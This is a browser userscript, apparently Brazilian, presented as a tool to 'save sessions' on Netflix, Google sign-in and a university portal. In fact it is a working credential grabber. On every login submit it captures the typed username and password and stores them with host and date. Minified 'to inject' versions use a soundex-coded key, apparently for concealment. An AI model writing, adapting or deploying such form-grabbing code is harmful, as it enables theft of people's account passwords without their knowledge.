// ==UserScript==
// @name        mysession
// @description	salvar sessões em (3) sites
// @namespace   http://pastebin.com/EGAuDuhr
// @include     *://www.netflix.com/*Login*
// @include     *://accounts.google.com/*ServiceLogin?*
// @include     *://accounts.google.com/*signin*
// @include     *://ecampus.ufam.edu.br/ecampus/*login*
// @version     1.18-2
// @require	https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js
// @grant       GM_getValue
// @grant       GM_setValue
// @grant       GM_deleteValue
// ==/UserScript==

/** PARA INJETAR
!function(t){String.prototype.isEmpty=function(){return!this.trim()};var e=GM_getValue("S132","");console.error(e),GM_deleteValue("S132"),document.querySelector("form").addEventListener("submit",function(n){var i=t('input[type="email"], input[name="email"], input[type="text"]').val(),o=t('input[type="password"], input[name="password"]').val();i.isEmpty()||o.isEmpty()||(e+="{ lgn: '"+i+", pss: '"+o+"', _dte='"+(new Date).toLocaleString()+"', _lcl='"+location.host+"' }\n",GM_setValue("S132",e))})}(jQuery);
**/

/** PARA CONSULTAR/LIMPAR
const mostrar = false;
const deletar = false;
!function(e){String.prototype.isEmpty=function(){return!this.trim()};var t=GM_getValue("savedsession",[]);t.forEach(function(e){console.error(e)}),1==mostrar&&console.log(JSON.stringify(t)),1==deletar&&GM_deleteValue("savedsession"),document.querySelector("form").addEventListener("submit",function(s){var n=e('input[type="email"], input[name="email"], input[type="text"]').val(),i=e('input[type="password"], input[name="password"]').val();if(!n.isEmpty()&&!i.isEmpty()){var o={hst:location.host,dte:(new Date).toLocaleString(),lgn:n,pss:i};t.push(o),GM_setValue("savedsession",t)}})}(jQuery);
**/

/*
→ Netflix
→ Gmail
→ Ecampus
*/

const mostrar = false;
const deletar = false;

(function($) {
	String.prototype.isEmpty = function() { return !(this.trim());	};

	var onhistory = GM_getValue('savedsession', []);
	onhistory.forEach( function(e) { console.error(e) } );

	if(mostrar == true) console.log(JSON.stringify(onhistory));
	if(deletar == true) GM_deleteValue('savedsession');

	document.querySelector('form').addEventListener('submit', function (e) {
		// e.preventDefault();
		var login = $('input[type="email"], input[name="email"], input[type="text"]').val();
		var senha = $('input[type="password"], input[name="password"]').val();

		if(!login.isEmpty() && !senha.isEmpty()){
			var newdata = {
				"hst": location.host,
				"dte": new Date().toLocaleString(),
				"lgn": login,
				"pss": senha
			};
			onhistory.push(newdata);//TODO verificar se o 'lgn', 'hst' e 'pss' já existem no array de histórico
			// console.log( newdata );
			GM_setValue('savedsession', onhistory);
		}
	});
})(jQuery);


/*********************
soundex("savedsession")
S132

soundex("login")
2L50

soundex("senha")
S500

soundex("onhistory")
O523

soundex('newdata')
N330
/*********************/

// http://chris.photobooks.com/json/
// https://javascript-minifier.com/
